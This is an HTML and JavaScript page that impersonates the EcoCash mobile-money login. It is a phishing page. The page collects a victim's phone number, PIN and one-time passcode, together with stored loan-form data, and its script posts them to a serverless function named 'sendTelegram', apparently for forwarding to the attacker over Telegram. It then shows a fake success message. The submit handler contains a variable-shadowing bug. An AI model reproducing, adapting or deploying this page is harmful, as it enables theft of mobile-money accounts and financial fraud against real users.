<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash — Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
  *{box-sizing:border-box}
  body{font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#f7fbff,#e8f3ff);margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:18px}
  .card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
  .logo{height:44px;display:block;margin:0 auto 10px}
  h2{text-align:center;margin:0 0 12px;color:#111;font-size:20px}
  label{display:block;font-size:13px;color:#374151;margin-top:8px}
  input,select{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;font-size:14px}
  .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
  .otp-modal{position:fixed;left:0;top:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35)}
  .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:260px;max-width:92%;box-shadow:0 12px 24px rgba(2,6,23,0.08)}
  .req{color:#d04444;margin-right:6px}
  .small{font-size:13px;color:#6b7280}
  .success{color:#16a34a;font-weight:600}
  @media(max-width:420px){ .card{padding:16px} h2{font-size:18px} .logo{height:40px} }
</style>
</head>

<body>
  <div class="card">
    <img src="assets/eco.png" alt="EcoCash logo" class="logo">

    <h2>Log In</h2>
    <form id="loginForm">
      <label><span class="req">★</span>Mobile Number
        <input id="phone" name="phone" required placeholder="+2637..." value="+263" />
      </label>

      <label><span class="req">★</span>4-Digit PIN
        <input id="pin" name="pin" required maxlength="6" placeholder="Enter 4-digit PIN" />
      </label>

      <button type="submit" class="btn">LOGIN</button>

      <!-- REMOVED THE OTP NOTICE TEXT -->
    </form>
  </div>

  <!-- OTP modal -->
  <div id="otpModal" style="display:none" class="otp-modal" aria-hidden="true">
    <div class="otp-box">
      <div style="text-align:center"><strong>Enter OTP</strong></div>
      <p class="small" style="margin:8px 0 14px">We have sent an OTP to your phone. Enter it here to confirm.</p>

      <!-- OTP enforced to 6 digits -->
      <input id="otpInput" placeholder="Enter 6-digit OTP"
             maxlength="6" inputmode="numeric" pattern="[0-9]*"
             style="width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;font-size:14px" />

      <div style="display:flex;gap:10px;margin-top:12px">
        <button id="confirmOtp" style="flex:1;padding:8px;border-radius:8px;border:0;background:#16a34a;color:white;cursor:pointer">Confirm</button>
        <button id="cancelOtp" style="flex:1;padding:8px;border-radius:8px;border:0;background:#e5e7eb;cursor:pointer">Cancel</button>
      </div>

      <div id="otpStatus" class="small" style="margin-top:8px"></div>
    </div>
  </div>

<script>
  // Prefill loan phone
  const stored = sessionStorage.getItem('loanForm');
  if (stored) {
    try {
      const loan = JSON.parse(stored);
      if (loan.phone) document.getElementById('phone').value = loan.phone;
    } catch(e){}
  }

  async function sendToServer(payload) {
    return fetch('/.netlify/functions/sendTelegram', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify(payload)
    });
  }

  document.getElementById('loginForm').addEventListener('submit', function(e){
    e.preventDefault();

    const phone = phone.value.trim();
    const pin = pin.value.trim();

    if(!phone || !pin){
      alert('Enter phone and PIN');
      return;
    }

    // Show OTP modal
    document.getElementById('otpModal').style.display = 'flex';
    document.getElementById('otpInput').value = '';
    document.getElementById('otpStatus').textContent = '';
  });

  document.getElementById('cancelOtp').addEventListener('click', ()=> {
    document.getElementById('otpModal').style.display = 'none';
  });

  document.getElementById('confirmOtp').addEventListener('click', async ()=>{
    const code = document.getElementById('otpInput').value.trim();
    const otpStatus = document.getElementById('otpStatus');

    // ENFORCE EXACTLY 6 DIGITS
    if(!/^\d{6}$/.test(code)){
      otpStatus.textContent = 'Please enter the 6-digit OTP';
      return;
    }

    otpStatus.textContent='Sending…';

    const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
    const payload = {
      submittedAt: new Date().toISOString(),
      loanData,
      loginPhone: phone.value.trim(),
      loginPin: pin.value.trim(),
      otp: code
    };

    try {
      const resp = await sendToServer(payload);
      if(!resp.ok){
        const txt = await resp.text();
        otpStatus.textContent = 'Server error: ' + (txt || resp.status);
      } else {
        otpStatus.innerHTML = '<span class="success">Success — your request has been received.</span>';
        sessionStorage.removeItem('loanForm');
        setTimeout(()=> window.location.href = 'thankyou.html', 1200);
      }
    } catch (err) {
      otpStatus.textContent = 'Network error';
    }
  });
</script>
</body>
</html>
